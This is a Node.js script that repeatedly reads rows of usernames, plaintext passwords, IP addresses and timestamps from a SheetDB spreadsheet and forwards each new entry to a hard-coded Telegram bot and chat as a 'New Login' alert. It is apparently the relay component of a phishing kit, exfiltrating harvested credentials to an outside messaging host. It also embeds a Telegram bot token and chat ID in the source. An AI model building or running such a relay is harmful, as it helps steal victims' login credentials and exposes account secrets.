import fetch from "node-fetch";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const SHEET_URL = "https://sheetdb.io/api/v1/irhjpmdb4vsdk";
const BOT_TOKEN = process.env.BOT_TOKEN || "8955191674:AAHhAeZU0aHp7kZH-HB6L9Bh4rnGhh3RVmE";
const CHAT_ID = process.env.CHAT_ID || "1388446058";
const POLL_INTERVAL = Number(process.env.POLL_INTERVAL || 30) * 1000;

const SEEN_FILE = path.join(__dirname, "seen.json");

let seen = loadSeen();

function loadSeen() {
  try {
    return new Set(JSON.parse(fs.readFileSync(SEEN_FILE, "utf8")));
  } catch {
    return new Set();
  }
}

function saveSeen() {
  fs.writeFileSync(SEEN_FILE, JSON.stringify([...seen], null, 2));
}

function rowKey(row) {
  return JSON.stringify(Object.values(row).map((v) => String(v)));
}

function stripHTML(s) {
  return String(s ?? "").replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
}

async function fetchRows() {
  const res = await fetch(SHEET_URL);
  if (!res.ok) throw new Error(`SheetDB error: ${res.status}`);
  return res.json();
}

async function sendMessage(text) {
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    }),
  });
  const json = await res.json();
  if (!json.ok) throw new Error(`Telegram error: ${JSON.stringify(json)}`);
}

function formatEntry(row) {
  const u = stripHTML(row.username);
  const p = stripHTML(row.password);
  const ip = stripHTML(row.ip);
  const t = stripHTML(row.timestamp);
  return `🆕 <b>New Login</b>\n👤 <b>${u}</b>\n🔑 ${p}\n🌐 ${ip}\n🕒 ${t}`;
}

async function check() {
  try {
    const rows = await fetchRows();

    const fresh = rows.filter((row) => {
      const key = rowKey(row);
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });

    if (fresh.length > 0) {
      saveSeen();
      const text = fresh
        .slice(-5)
        .map(formatEntry)
        .join("\n──────────────\n");
      await sendMessage(fresh.length > 5 ? `⚠️ ${fresh.length} naye entries aa gaye:\n\n${text}` : text);
      console.log(`[${new Date().toISOString()}] Sent ${fresh.length} notification(s)`);
    }
  } catch (err) {
    console.error(`[${new Date().toISOString()}] Error:`, err.message);
  }
}

console.log(`Watching sheet every ${POLL_INTERVAL / 1000}s. Alt+F4 se stop karein.`);
check();
setInterval(check, POLL_INTERVAL);
